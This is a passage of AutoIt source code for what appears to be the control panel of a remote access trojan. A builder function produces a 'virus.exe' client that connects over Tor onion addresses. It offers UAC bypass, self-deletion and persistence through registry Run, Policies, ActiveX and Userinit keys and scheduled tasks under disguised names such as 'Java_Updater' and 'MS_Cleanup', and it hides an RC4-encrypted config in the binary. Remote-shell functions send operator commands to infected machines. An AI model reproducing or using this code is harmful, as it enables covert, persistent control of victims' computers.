		GUICtrlSetState($idInputDelay, $GUI_DISABLE)
	Else
		GUICtrlSetState($idGroupInstallLocation, $GUI_ENABLE)
		GUICtrlSetState($idRadioAppData, $GUI_ENABLE)
		GUICtrlSetState($idRadioLocalAppData, $GUI_ENABLE)
		GUICtrlSetState($idRadioTemp, $GUI_ENABLE)
		GUICtrlSetState($idRadioCustomPath, $GUI_ENABLE)
		GUICtrlSetState($idInputCustomPath, $GUI_ENABLE)
		GUICtrlSetState($idLabelFolder, $GUI_ENABLE)
		GUICtrlSetState($idLabelFileName, $GUI_ENABLE)
		GUICtrlSetState($idInputFolder, $GUI_ENABLE)
		GUICtrlSetState($idInputFileName, $GUI_ENABLE)

		GUICtrlSetState($idGroupInstallOptions, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxPersistence, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxMelt, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxRemoveIcon, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxBypassUAC, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxDelay, $GUI_ENABLE)
		GUICtrlSetState($idInputDelay, $GUI_ENABLE)
	EndIf
EndFunc

Func BuilderAutostartClient()
	If GUICtrlRead($idCheckboxAutostartClient) = $GUI_UNCHECKED Then
		GUICtrlSetState($idGroupAutostartMethod, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxHKCURun, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxHKCULoad, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxStartupDir, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxTaskScheduler, $GUI_DISABLE)
		GUICtrlSetState($idInputHKCURun, $GUI_DISABLE)
		GUICtrlSetState($idInputStartupDir, $GUI_DISABLE)
		GUICtrlSetState($idInputTaskScheduler, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxHKLMUserInit, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxHKLMRun, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxHKLMPolicies, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxAllStartupDir, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxAdminTaskScheduler, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxHKCUPolicies, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxHKLMActivX, $GUI_DISABLE)
		GUICtrlSetState($idInputHKLMRun, $GUI_DISABLE)
		GUICtrlSetState($idInputAllStartupDir, $GUI_DISABLE)
		GUICtrlSetState($idInputAdminTaskScheduler, $GUI_DISABLE)
		GUICtrlSetState($idInputHKCUPolicies, $GUI_DISABLE)
		GUICtrlSetState($idInputHKLMPolicies, $GUI_DISABLE)
		GUICtrlSetState($idInputHKLMActivX, $GUI_DISABLE)
	Else
		GUICtrlSetState($idGroupAutostartMethod, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxHKCURun, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxHKCULoad, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxStartupDir, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxTaskScheduler, $GUI_ENABLE)
		GUICtrlSetState($idInputHKCURun, $GUI_ENABLE)
		GUICtrlSetState($idInputStartupDir, $GUI_ENABLE)
		GUICtrlSetState($idInputTaskScheduler, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxHKLMUserInit, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxHKLMRun, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxHKLMPolicies, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxAllStartupDir, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxAdminTaskScheduler, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxHKCUPolicies, $GUI_ENABLE)
		GUICtrlSetState($idCheckboxHKLMActivX, $GUI_ENABLE)
		GUICtrlSetState($idInputHKLMRun, $GUI_ENABLE)
		GUICtrlSetState($idInputAllStartupDir, $GUI_ENABLE)
		GUICtrlSetState($idInputAdminTaskScheduler, $GUI_ENABLE)
		GUICtrlSetState($idInputHKCUPolicies, $GUI_ENABLE)
		GUICtrlSetState($idInputHKLMPolicies, $GUI_ENABLE)
		GUICtrlSetState($idInputHKLMActivX, $GUI_ENABLE)
	EndIf
EndFunc

Func BuilderCreateClient()
	Local $sMutex = "", $sClientTag = "", $sIcon = "" ;General
	Local $aOnionSockets[1], $sOnionSocket = StringStripWS(FileRead(@ScriptDir & "\System\Tor\Hidden_Service\hostname"),8) & ":" & "1594" ;Connection
	Local $iInstall = 0, $iStartup = 0, $sInstallLocation = "", $sInstallPath = "", $iPersistence = 0, $iMelt = 0, $iRemoveIcon = 0, $iBypassUAC = 0, $iDelay = 0, $sDelay = "" ;Install
	Local $iHKCURun = 0, $sHKCURun = "", $iHKCULoad = 0, $iStartupDir = 0, $sStartupDir = "", $iTaskScheduler = 0, $sTaskScheduler = "", $iHKCUPolicies = 0, $sHKCUPolicies = "", $iHKLMPolicies = 0, $sHKLMPolicies = "", $iHKLMActivX = 0, $sHKLMActivX = "";Install
	Local $iHKLMRun = 0, $sHKLMRun = "", $iHKLMUserInit = 0, $iAllStartupDir = 0, $sAllStartupDir = "", $iAdminTaskScheduler = 0, $sAdminTaskScheduler = "" ;Install
;~ 	Local ;Keylogger
	Local $iEoF = 0, $iResource = 0;CreateClient

	$sMutex = GUICtrlRead($idInputMutex)
	_BuilderLog("Read Mutex: " & $sMutex)
	$sClientTag = GUICtrlRead($idInputClientTag)
	_BuilderLog("Read Client Tag: " & $sClientTag)
	If GUICtrlRead($idCheckboxUseIcon) = $GUI_CHECKED Then $sIcon = GUICtrlRead($idInputIcon)
	_BuilderLog("Read Client Icon: " & $sIcon)
;--
	$iOnionCount = _GUICtrlListView_GetItemCount($idListviewOnion)

	If $iOnionCount > 0 Then
		ReDim $aOnionSockets[$iOnionCount]
		For $i = 0 To $iOnionCount -1
			$aOnionSockets[$i] = _GUICtrlListView_GetItemText($idListviewOnion, $i) & ":" & _GUICtrlListView_GetItemText($idListviewOnion, $i, 1)
		Next
		$sOnionSocket = _ArrayToString($aOnionSockets,",",-1,-1)
		_BuilderLog("Read Onion adresses: " & $sOnionSocket)
	Else
		_BuilderLog("Error reading connection adresses. Client could not be build.")
		Return
	EndIf
;--
	If GUICtrlRead($idCheckboxInstallClient) = $GUI_CHECKED Then
		$iInstall = 1
		_BuilderLog("Read Install: " & $iInstall)
		Select
			Case GUICtrlRead($idRadioAppData) = $GUI_CHECKED
				$sInstallLocation = "@AppDataDir"
			Case GUICtrlRead($idRadioLocalAppData) = $GUI_CHECKED
				$sInstallLocation = "@LoaclAppDataDir"
			Case GUICtrlRead($idRadioTemp) = $GUI_CHECKED
				$sInstallLocation = "@TempDir"
			Case GUICtrlRead($idRadioCustomPath) = $GUI_CHECKED
				If GUICtrlRead($idInputCustomPath) <> "" Then
					$sInstallLocation = GUICtrlRead($idInputCustomPath)
				Else
					$sInstallLocation = "c:\path"
				EndIf
		EndSelect
		_BuilderLog("Read Install Location: " & $sInstallLocation)

		If GUICtrlRead($idInputFileName) <> "" Then
			$sFileName = GUICtrlRead($idInputFileName)
		Else
			$sFileName = "Virus.exe"
		EndIf

		If GUICtrlRead($idInputFolder) <> "" Then
			$sFolder = GUICtrlRead($idInputFolder)
		Else
			$sFolder = "Virus"
		EndIf

		$sInstallPath = $sFolder & "\" & $sFileName

		_BuilderLog("Read Install Path: " & $sInstallPath)

		If GUICtrlRead($idCheckboxPersistence) = $GUI_CHECKED Then $iPersistence = 1
		_BuilderLog("Read Install Option Persistence : " & $iPersistence)
		If GUICtrlRead($idCheckboxMelt) = $GUI_CHECKED Then $iMelt = 1
		_BuilderLog("Read Install Option Melt : " & $iMelt)
		If GUICtrlRead($idCheckboxRemoveIcon) = $GUI_CHECKED Then $iRemoveIcon = 1
		_BuilderLog("Read Install Option Remove Icon: " & $iRemoveIcon)
		If GUICtrlRead($idCheckboxBypassUAC) = $GUI_CHECKED Then $iBypassUAC = 1
		_BuilderLog("Read Install Option BypassUAC: " & $iBypassUAC)

		If GUICtrlRead($idCheckboxDelay) = $GUI_CHECKED Then
			$iDelay = 1
			If GUICtrlRead($idInputDelay) <> "" Then
				$sDelay = GUICtrlRead($idInputDelay)
			Else
				$sDelay = "300"
			EndIf
			_BuilderLog("Read Install Option Delay: " & $iDelay & ", Delay in sec: " & $sDelay)
		Else
			_BuilderLog("Read Install Option Delay: " & $iDelay)
		EndIf
	Else
		_BuilderLog("Read Install: " & $iInstall)
	EndIf
;--
	If GUICtrlRead($idCheckboxAutostartClient) = $GUI_CHECKED Then
		$iStartup = 1
		_BuilderLog("Read Startup: " & $iStartup)
		If GUICtrlRead($idCheckboxHKCURun) = $GUI_CHECKED Then
			$iHKCURun = 1
			If GUICtrlRead($idInputHKCURun) <> "" Then
				$sHKCURun = GUICtrlRead($idInputHKCURun)
			Else
				$sHKCURun = "Java_Updater"
			EndIf
			_BuilderLog("Read Startup HKCURun: " & $iHKCURun & ", Key Name: " & $sHKCURun)
		Else
			_BuilderLog("Read Startup HKCURun: " & $iHKCURun)
		EndIf

		If GUICtrlRead($idCheckboxHKCULoad) = $GUI_CHECKED Then $iHKCULoad = 1
		_BuilderLog("Read Startup HKCULoad: " & $iHKCULoad)

		If GUICtrlRead($idCheckboxStartupDir) = $GUI_CHECKED Then
			$iStartupDir = 1
			If GUICtrlRead($idInputStartupDir) <> "" Then
				$sStartupDir = GUICtrlRead($idInputStartupDir) ;prüfen das immer .lnk dran steht ansonsten dran hängen
			Else
				$sStartupDir = "Office Toolbar.lnk"
			EndIf
			_BuilderLog("Read Startup StartupDir: " & $iStartupDir & ", Name: " & $sStartupDir)
		Else
			_BuilderLog("Read Startup StartupDir: " & $iStartupDir)
		EndIf

		If GUICtrlRead($idCheckboxTaskScheduler) = $GUI_CHECKED Then
			$iTaskScheduler = 1
			If GUICtrlRead($idInputTaskScheduler) <> "" Then
				$sTaskScheduler = GUICtrlRead($idInputTaskScheduler)
			Else
				$sTaskScheduler = "MS_Cleanup"
			EndIf
			_BuilderLog("Read Startup TaskScheduler: " & $iTaskScheduler & ", Task Name: " & $sTaskScheduler)
		Else
			_BuilderLog("Read Startup TaskScheduler: " & $iTaskScheduler)
		EndIf

		If GUICtrlRead($idCheckboxHKCUPolicies) = $GUI_CHECKED Then
			$iHKCUPolicies = 1
			If GUICtrlRead($idInputHKCUPolicies) <> "" Then
				$sHKCUPolicies = GUICtrlRead($idInputHKCUPolicies)
			Else
				$sHKCUPolicies = "Flash_Updater"
			EndIf
			_BuilderLog("Read Startup HKCUPolicies: " & $iHKCUPolicies & ", Key Name: " & $sHKCUPolicies)
		Else
			_BuilderLog("Read Startup HKCUPolicies: " & $iHKCUPolicies)
		EndIf

		If GUICtrlRead($idCheckboxHKLMPolicies) = $GUI_CHECKED Then
			$iHKLMPolicies = 1
			If GUICtrlRead($idInputHKLMPolicies) <> "" Then
				$sHKLMPolicies = GUICtrlRead($idInputHKLMPolicies)
			Else
				$sHKLMPolicies = "Flash_Updater"
			EndIf
			_BuilderLog("Read Startup HKLMPolicies: " & $iHKLMPolicies & ", Key Name: " & $sHKLMPolicies)
		Else
			_BuilderLog("Read Startup HKLMPolicies: " & $iHKLMPolicies)
		EndIf

		If GUICtrlRead($idCheckboxHKLMActivX) = $GUI_CHECKED Then
			$iHKLMActivX = 1
			If GUICtrlRead($idInputHKLMActivX) <> "" Then
				$sHKLMActivX = GUICtrlRead($idInputHKLMActivX)
			Else
				$sHKLMActivX = "{CUJ8I3HK-1556-JUJX-8524-BT0P88A84421}"
			EndIf
			_BuilderLog("Read Startup HKLMActivX: " & $iHKLMActivX & ", Name: " & $sHKLMActivX)
		Else
			_BuilderLog("Read Startup HKLMActivX: " & $iHKLMActivX)
		EndIf

		If GUICtrlRead($idCheckboxHKLMRun) = $GUI_CHECKED Then
			$iHKLMRun = 1
			If GUICtrlRead($idInputHKLMRun) <> "" Then
				$sHKLMRun = GUICtrlRead($idInputHKLMRun)
			Else
				$sHKLMRun = "Java_Updater"
			EndIf
			_BuilderLog("Read Startup HKLMRun: " & $iHKLMRun & ", Key Name: " & $sHKLMRun)
		Else
			_BuilderLog("Read Startup HKLMRun: " & $iHKLMRun)
		EndIf

		If GUICtrlRead($idCheckboxHKLMUserInit) = $GUI_CHECKED Then $iHKLMUserInit = 1
		_BuilderLog("Read Startup HKLMUserInit: " & $iHKLMUserInit)

		If GUICtrlRead($idCheckboxAllStartupDir) = $GUI_CHECKED Then
			$iAllStartupDir = 1
			If GUICtrlRead($idInputAllStartupDir) <> "" Then
				$sAllStartupDir = GUICtrlRead($idInputAllStartupDir)
			Else
				$sAllStartupDir = "OfficeToolbar.lnk"
			EndIf
			_BuilderLog("Read Startup AllStartupDir: " & $iAllStartupDir & ", Name: " & $sAllStartupDir)
		Else
			_BuilderLog("Read Startup AllStartupDir: " & $iAllStartupDir)
		EndIf

		If GUICtrlRead($idCheckboxAdminTaskScheduler) = $GUI_CHECKED Then
			$iAdminTaskScheduler = 1
			If GUICtrlRead($idInputAdminTaskScheduler) <> "" Then
				$sAdminTaskScheduler = GUICtrlRead($idInputAdminTaskScheduler)
			Else
				$sAdminTaskScheduler = "MS_DiskCleanup"
			EndIf
			_BuilderLog("Read Startup AdminTaskScheduler: " & $iAdminTaskScheduler & ", Task Name: " & $sAdminTaskScheduler)
		Else
			_BuilderLog("Read Startup AdminTaskScheduler: " & $iAdminTaskScheduler)
		EndIf
	Else
		_BuilderLog("Read Startup: " & $iStartup)
	EndIf
;--
	If GUICtrlRead($idRadioEoF) = 1 Then $iEoF = 1
	If GUICtrlRead($idRadioResource) = 1 Then $iResource = 1
	_BuilderLog("Read Build Method: " & "EndOfFile: " & $iEoF & ", Resource: " & $iResource)

;--
	$sBuilderGeneral = "---General---" & $sMutex & "|" & $sClientTag & "|" & $sIcon & "---General---"
	$sBuilderConnection = "---Connection---" & $sOnionSocket & "---Connection---"
	$sBuilderInstall = "---Install---" & $iInstall & "|" & $iStartup & "|" & $sInstallLocation & "|" & $sInstallPath & "|" & $iPersistence & "|" & $iMelt & "|" & $iRemoveIcon & "|" & $iBypassUAC & "|" & $iDelay & "|" & $sDelay & _
	"|" & $iHKCURun & "|" & $sHKCURun & "|" & $iHKCULoad & "|" & $iStartupDir & "|" & $sStartupDir & "|" & $iTaskScheduler & "|" & $sTaskScheduler & "|" & $iHKCUPolicies & _
	"|" & $sHKCUPolicies & "|" & $iHKLMPolicies & "|" & $sHKLMPolicies & "|" & $iHKLMActivX & "|" & $sHKLMActivX & "|" & $iHKLMRun & "|" & $sHKLMRun & "|" & $iHKLMUserInit & _
	"|" & $iAllStartupDir & "|" & $sAllStartupDir & "|" & $iAdminTaskScheduler & "|" & $sAdminTaskScheduler & "---Install---"
	$sBuilderKeylogger = "---Keylogger---" & "---Keylogger---"
	$sBuilderCreate = "---Create---" & $iEoF & "|" & $iResource & "---Create---"
	$sBuilder = "---Builder---" & $sBuilderGeneral & $sBuilderConnection & $sBuilderInstall & $sBuilderKeylogger & $sBuilderCreate & "---Builder---"
	_BuilderLog("Generating Builder String: " & $sBuilder)
	$dBuilderEncrypted = _Crypt_EncryptData($sBuilder, "LSAfoo93n.-,§dd2", $CALG_RC4) ; Encrypt the data.
	_BuilderLog("Encrypting Builder String: " & $dBuilderEncrypted)
;--
	FileDelete(@ScriptDir & "\virus.exe")
	FileCopy(@ScriptDir & "\Stub.exe", @ScriptDir & "\virus.exe")
	_BuilderLog("Creating virus.exe")
;--

	If $iResource = 1 Then
		$sFilePath = @ScriptDir & "\virus.exe"
		$hRCData = FileOpen(@ScriptDir & "\rcdata",10)
		FileWrite($hRCData, $dBuilderEncrypted)
		FileClose($hRCData)
		$hResource = _Resource($sFilePath)
		_Resource_Update($hResource, @ScriptDir & "\rcdata", "Settings" , $RT_RCDATA)
		_Resource_Close($hResource)
		FileDelete(@ScriptDir & "\rcdata")
		_BuilderLog("Added Builder String to RCData Resource")
	EndIf

	If $sIcon <> "" Then
		Local $iError = 1
		Do
			; Begin update resources
			Local $hUpdate = _WinAPI_BeginUpdateResource(@ScriptDir & "\virus.exe")
			If @error Then
				ExitLoop
			EndIf
			; Read .ico file as raw binary data into the structure
			Local $tIcon = DllStructCreate('ushort Reserved;ushort Type;ushort Count;byte[' & (FileGetSize($sIcon) - 6) & ']')
			Local $pIcon = DllStructGetPtr($tIcon)
			Local $hFile = _WinAPI_CreateFile($sIcon, 2, 2)
			If Not $hFile Then
				ExitLoop
			EndIf
			Local $iBytes = 0
			_WinAPI_ReadFile($hFile, $pIcon, DllStructGetSize($tIcon), $iBytes)
			_WinAPI_CloseHandle($hFile)
			If Not $iBytes Then
				ExitLoop
			EndIf
			; Add all icons from .ico file into the RT_ICON resources identified as 400, 401, etc., and fill group icons structure
			Local $iCount = DllStructGetData($tIcon, 'Count')
			Local $tDir = DllStructCreate($tagNEWHEADER & 'byte[' & (14 * $iCount) & ']')
			Local $pDir = DllStructGetPtr($tDir)
			DllStructSetData($tDir, 'Reserved', 0)
			DllStructSetData($tDir, 'ResType', 1)
			DllStructSetData($tDir, 'ResCount', $iCount)
			Local $tInfo, $iSize, $tData, $iID = 1 ;400
			For $i = 1 To $iCount
				$tInfo = DllStructCreate('byte Width;byte Heigth;byte Colors;byte Reserved;ushort Planes;ushort BPP;dword Size;dword Offset', $pIcon + 6 + 16 * ($i - 1))
				$iSize = DllStructGetData($tInfo, 'Size')

				If Not _WinAPI_UpdateResource($hUpdate, $RT_ICON, $iID, 0, $pIcon + DllStructGetData($tInfo, 'Offset'), $iSize) Then
		;~ 		If Not _WinAPI_UpdateResource($hUpdate, $RT_ICON, $iID, 0, 0, 0) Then;$pIcon + DllStructGetData($tInfo, 'Offset'), $iSize) Then
					ExitLoop 2
				EndIf
				$tData = DllStructCreate($tagICONRESDIR, $pDir + 6 + 14 * ($i - 1))
				DllStructSetData($tData, 'Width', DllStructGetData($tInfo, 'Width'))
				DllStructSetData($tData, 'Height', DllStructGetData($tInfo, 'Heigth'))
				DllStructSetData($tData, 'ColorCount', DllStructGetData($tInfo, 'Colors'))
				DllStructSetData($tData, 'Reserved', 0)
				DllStructSetData($tData, 'Planes', DllStructGetData($tInfo, 'Planes'))
				DllStructSetData($tData, 'BitCount', DllStructGetData($tInfo, 'BPP'))
				DllStructSetData($tData, 'BytesInRes', $iSize)
				DllStructSetData($tData, 'IconId', $iID)

				$iID += 1
			Next
			;del autoit standard icons and strings

			$aIconCount = _WinAPI_EnumResourceNames(@ScriptDir & '\stub.exe', $RT_ICON)
			$aStringCount = _WinAPI_EnumResourceNames(@ScriptDir & '\stub.exe', $RT_STRING)
			For $i = 1 To $aIconCount[0];11 bei beta ;TO DO - get RT_ICON Count
				If Not _WinAPI_UpdateResource($hUpdate, $RT_ICON, $aIconCount[$i], 2057, 0, 0) Then
					ExitLoop 2
				EndIf
			Next
			If Not _WinAPI_UpdateResource($hUpdate, $RT_GROUP_ICON, 99, 2057, 0, 0) Then
				ExitLoop
			EndIf

			If Not _WinAPI_UpdateResource($hUpdate, $RT_GROUP_ICON, 169, 2057, 0, 0) Then
				ExitLoop
			EndIf
			;del strings
			For $i = 1 to $aStringCount[0]
				If Not _WinAPI_UpdateResource($hUpdate, $RT_STRING, $aStringCount[$i], 2057, 0, 0) Then
					ExitLoop 2
				EndIf
			Next

;~ 			If Not _WinAPI_UpdateResource($hUpdate, $RT_STRING, 313, 2057, 0, 0) Then
;~ 				ExitLoop
;~ 			EndIf

			; Add new RT_GROUP_ICON resource named as "MAINICON"
			If Not _WinAPI_UpdateResource($hUpdate, $RT_GROUP_ICON, 'MAINICON', 0, $pDir, DllStructGetSize($tDir)) Then
				ExitLoop
			EndIf
			$iError = 0

		Until 1

		; Save or discard changes of the resources within an executable file
		If Not _WinAPI_EndUpdateResource($hUpdate, $iError) Then
			$iError = 1
		EndIf

		; Show message if an error occurred
		If $iError Then
			MsgBox(BitOR($MB_ICONERROR, $MB_SYSTEMMODAL), 'Error', 'Unable to change Icon', 5)
		EndIf
		_BuilderLog("Icon Changed")
	EndIf

	If $iEoF = 1 Then
		$hStub = FileOpen(@ScriptDir & "\virus.exe",16)
		$sStub = BinaryToString(FileRead($hStub))
		FileClose($hStub)
		$hServer = FileOpen(@ScriptDir & "\virus.exe",26)
		FileWrite($hServer, $sStub & $dBuilderEncrypted)
		FileClose($hServer)
		_BuilderLog("Added Builder String to EoF")
	EndIf

	_BuilderLog("Client Build completed to virus.exe")
EndFunc

#EndRegion gui functions Builder

#Region gui functions RemoteShell

Func RemoteShellGUI()
	$iRemoteShellGUIIndex = UBound($aRemoteShellGUI)
	ReDim $aRemoteShellGUI[$iRemoteShellGUIIndex +1][50]
	Local $aSelected
    $aSelected = _GUICtrlListView_GetSelectedIndices($idLVConnections, True)
    If $aSelected[0] > 0 Then
		For $i = 1 To $aSelected[0]
			$sPCName = _GUICtrlListView_GetItemText($idLVConnections, $aSelected[$i], 4)
			$iSocket = _GetSocketNoFromLVItemIndex($aSelected[$i]) ;$iSocket
			#include "GUI\RemoteShell.au3"
			_Send($aRemoteShellGUI[$iRemoteShellGUIIndex][0], $sPacketRemoteShell & "START_SHELL" & $sPacketEND)
			_Log('[Client] Remote Shell started on "' & $sPCName & '" on Socket ' & $iSocket)
		Next
	Else
		MsgBox(0,"","No Client selected",5)
	EndIf
EndFunc

Func RemoteShellSend()
	$iRemoteShellGUIIndex = _ArraySearch($aRemoteShellGUI, @GUI_WinHandle, 0, 0, 0, 1, 1, 2)
	If $iRemoteShellGUIIndex = -1 Then Return
	$sCommand = GUICtrlRead($aRemoteShellGUI[$iRemoteShellGUIIndex][5])
	_Send($aRemoteShellGUI[$iRemoteShellGUIIndex][0], $sPacketRemoteShell & "CMD" & $sPacketDivider & $sCommand & $sPacketEND)
	GUICtrlSetData($aRemoteShellGUI[$iRemoteShellGUIIndex][5],"")
	If $aRemoteShellGUI[$iRemoteShellGUIIndex][38] = 10 Then
		For $i = 40 to 48
			$aRemoteShellGUI[$iRemoteShellGUIIndex][$i] = $aRemoteShellGUI[$iRemoteShellGUIIndex][$i +1]
		Next
	Else
		$aRemoteShellGUI[$iRemoteShellGUIIndex][38] += 1
	EndIf
	$aRemoteShellGUI[$iRemoteShellGUIIndex][39] = 40 + $aRemoteShellGUI[$iRemoteShellGUIIndex][38]
	If $sCommand = "" Then
	Else
		$aRemoteShellGUI[$iRemoteShellGUIIndex][40 + $aRemoteShellGUI[$iRemoteShellGUIIndex][38] -1] = $sCommand
	EndIf

EndFunc

Func RemoteShellCtrlC()
	$iRemoteShellGUIIndex = _ArraySearch($aRemoteShellGUI, @GUI_WinHandle, 0, 0, 0, 1, 1, 2)
	If $iRemoteShellGUIIndex = -1 Then Return
	_Send($aRemoteShellGUI[$iRemoteShellGUIIndex][0], $sPacketRemoteShell & "CTRL_C" & $sPacketEND)
EndFunc

Func RemoteShellUp()
	$iRemoteShellGUIIndex = _ArraySearch($aRemoteShellGUI, @GUI_WinHandle, 0, 0, 0, 1, 1, 2)
	If $iRemoteShellGUIIndex = -1 Then Return
	If $aRemoteShellGUI[$iRemoteShellGUIIndex][39] = 40 Then
	Else
		$aRemoteShellGUI[$iRemoteShellGUIIndex][39] -= 1
	EndIf
	GUICtrlSetData($aRemoteShellGUI[$iRemoteShellGUIIndex][5], $aRemoteShellGUI[$iRemoteShellGUIIndex][$aRemoteShellGUI[$iRemoteShellGUIIndex][39]])
EndFunc

Func RemoteShellDown()
	$iRemoteShellGUIIndex = _ArraySearch($aRemoteShellGUI, @GUI_WinHandle, 0, 0, 0, 1, 1, 2)
	If $iRemoteShellGUIIndex = -1 Then Return
	If $aRemoteShellGUI[$iRemoteShellGUIIndex][39] = 40 + $aRemoteShellGUI[$iRemoteShellGUIIndex][38] -1 Then
	Else
		$aRemoteShellGUI[$iRemoteShellGUIIndex][39] += 1
	EndIf
	GUICtrlSetData($aRemoteShellGUI[$iRemoteShellGUIIndex][5], $aRemoteShellGUI[$iRemoteShellGUIIndex][$aRemoteShellGUI[$iRemoteShellGUIIndex][39]])
EndFunc

Func RemoteShellRCV($sCompletePacket, $iSocket)
	$iRemoteShellGUIIndex = _ArraySearch($aRemoteShellGUI, $iSocket, 0, 0, 0, 1, 1, 0)
	If $iRemoteShellGUIIndex = -1 Then Return
	$sHistory = GUICtrlRead($aRemoteShellGUI[$iRemoteShellGUIIndex][3])
;~ 	$CmdCheck = GUICtrlRead($Connection[$ArraySlotNumber][4][5])
;~ 	If  $CmdCheck = 1 and $FirstTime = 1 Then
;~ 		GUICtrlSetData($Connection[$ArraySlotNumber][4][1], $sHistory & $eingabe & @CRLF & $CompletePacket)
;~ 		$FirstTime = 0
;~ 	Else
		GUICtrlSetData($aRemoteShellGUI[$iRemoteShellGUIIndex][3], $sHistory & $sCompletePacket)
;~ 	EndIf
	_GUICtrlEdit_Scroll($aRemoteShellGUI[$iRemoteShellGUIIndex][3], $SB_SCROLLCARET)
EndFunc


Func CLOSEClickedRemoteShell()
	$iRemoteShellGUIIndex = _ArraySearch($aRemoteShellGUI, @GUI_WinHandle, 0, 0, 0, 1, 1, 2)
	If $iRemoteShellGUIIndex = -1 Then Return
	_Send($aRemoteShellGUI[$iRemoteShellGUIIndex][0], $sPacketRemoteShell & "END_SHELL" & $sPacketEND)
	$iSocket = $aRemoteShellGUI[$iRemoteShellGUIIndex][0]
	$sPCName = $aRemoteShellGUI[$iRemoteShellGUIIndex][1]
	_Log('[Client] Remote Shell closed on "' & $sPCName & '" on Socket ' & $iSocket)
	_ArrayDelete($aRemoteShellGUI, $iRemoteShellGUIIndex)
	GUIDelete(@GUI_WinHandle)
EndFunc

Func CLOSEClickedMain()
	_Exit()
EndFunc

#EndRegion gui functions RemoteShell

#Region wrapper functions

Func _Send($iSocket,$sDataToSend)
	$sBufferToSend = _WriteBuffer($sDataToSend, $iSocket, "SendBuffer")
	TCPSend($iSocket, $sBufferToSend)
	If @error Then
		$iError = @error
		If $iError <> 10035 Then
			ConsoleWrite("_Send $iError2: " & $iError & @CRLF)
			_ClearAndWriteBuffer("", $iSocket, "SendBuffer") ;clear buffer
			CloseConnection($iSocket)
			SetError($iError,2)
			Return
		Else
			ConsoleWrite("_Send $iError1: " & $iError & @CRLF)
			_ClearAndWriteBuffer("", $iSocket, "SendBuffer") ;clear buffer
			SetError($iError,1)
			Return
		EndIf
	EndIf
	_ClearAndWriteBuffer("", $iSocket, "SendBuffer") ;clear buffer
EndFunc

Func _SortLVConnections()
	_GUICtrlListView_SortItems($idLVConnections, GUICtrlGetState($idLVConnections))
EndFunc

Func _GetDBCount()
	Local $aRow
	_SQLite_Query($hDBConnections, "SELECT count(*) FROM tblConnections;", $hQueryGetDBCount);get DB Count
	_SQLite_FetchData($hQueryGetDBCount, $aRow)
	_SQLite_QueryFinalize($hQueryGetDBCount)
	Return $aRow[0]
EndFunc

Func _GetSocketNoFromLVItemIndex($iLVItemIndex)
	Local $aRow
	$iLVItemID = _GUICtrlListView_MapIndexToID($idLVConnections, $iLVItemIndex)
	_SQLite_QuerySingleRow($hDBConnections, "SELECT SocketNo FROM tblConnections WHERE LVItemID = " & $iLVItemID & ";", $aRow) ;get LVItemID
	$iSocket = $aRow[0]
	Return $iSocket
EndFunc

Func _GetLVItemIndex($iSocket)
	Local $aRow
	If _SQLite_QuerySingleRow($hDBConnections, "SELECT LVItemID FROM tblConnections WHERE SocketNo = " & $iSocket & ";", $aRow) = $SQLITE_OK Then ;get LVItemID
		$iLVItemIndex = _GUICtrlListView_MapIDToIndex($idLVConnections, Int($aRow[0]))
		Return $iLVItemIndex
	EndIf
EndFunc

Func _GetLVItemID($iSocket)
	Local $aRow
	_SQLite_QuerySingleRow($hDBConnections, "SELECT LVItemID FROM tblConnections WHERE SocketNo = " & $iSocket & ";", $aRow) ;get LVItemID
	$iLVItemID = $aRow[0]
	Return $iLVItemID
EndFunc

Func _ClearAndWriteBuffer($sData, $iSocket, $sWhichBuffer = "RecvBuffer")
	_SQLite_Exec($hDBConnections, "UPDATE tblConnections SET " & $sWhichBuffer & "=" & "'" & $sData & "'" & " WHERE SocketNo = " & $iSocket & ";") ;write RecvBuffer to DB
	Return $sData
EndFunc

Func _WriteBuffer($sData, $iSocket, $sWhichBuffer = "RecvBuffer")
	Local $aRecvBuffer
	_SQLite_QuerySingleRow($hDBConnections, "SELECT " & $sWhichBuffer & " FROM tblConnections WHERE SocketNo = " & $iSocket & ";", $aRecvBuffer) ;get RecvBuffer
	;if is not array close socket
	$sBuffer = $aRecvBuffer[0] & $sData
	_SQLite_Exec($hDBConnections, "UPDATE tblConnections SET " & $sWhichBuffer & "=" & "'" & $sBuffer & "'" & " WHERE SocketNo = " & $iSocket & ";") ;write RecvBuffer to DB
	Return $sBuffer
EndFunc

Func _Log($sEditText)
	_GUICtrlEdit_AppendText($idEditLog, "[" & @HOUR & ":" & @MIN & ":" & @SEC & "]" & " " & $sEditText & @CRLF)
	;write log to file
EndFunc

Func _LogVerbose($sEditText)
	If $bFlagVerbose = 1 Then
		_GUICtrlEdit_AppendText($idEditLog, "[" & @HOUR & ":" & @MIN & ":" & @SEC & "]" & " " & $sEditText & @CRLF)
	EndIf
	;write log to file
EndFunc

Func _BuilderLog($sEditText)
	_GUICtrlEdit_AppendText($idEditBuildLog, "[" & @HOUR & ":" & @MIN & ":" & @SEC & "]" & " " & $sEditText & @CRLF)
EndFunc

Func _GCM_SetIcon($sFileIcon, $iMenu, $iItem, $iW = 16, $iH = 16) ;16 16
    Local $aResources[3]
    $aResources[0] = _WinAPI_LoadImage(0, $sFileIcon, $IMAGE_ICON, $iW, $iH, $LR_LOADFROMFILE) ;$hIcon
